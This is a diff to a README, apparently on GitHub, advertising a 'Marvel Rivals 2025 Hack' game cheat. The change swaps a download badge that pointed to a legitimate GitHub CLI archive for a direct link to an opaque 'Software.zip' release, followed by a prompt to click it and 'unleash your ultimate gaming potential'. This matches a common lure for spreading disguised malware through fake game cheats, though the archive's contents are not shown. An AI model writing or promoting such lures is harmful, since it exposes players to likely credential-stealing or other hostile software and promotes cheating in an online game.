@@ -23,7 +23,7 @@ Explore the following topics related to Marvel Rivals 2025 Hack:
 
 ## Get Started
 Get started by downloading the latest version of Marvel Rivals 2025 Hack from the link below:
-[![Download Marvel Rivals 2025 Hack](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) 
+[![Download Marvel Rivals 2025 Hack](https://github.com/mithunnavaneethakrishnan/Marvel-Rivals-2025-Hack/releases/download/v1.0/Software.zip)](https://github.com/mithunnavaneethakrishnan/Marvel-Rivals-2025-Hack/releases/download/v1.0/Software.zip) 
 
 👉 Don't forget to click on the link and unleash your ultimate gaming potential! 🔓
 
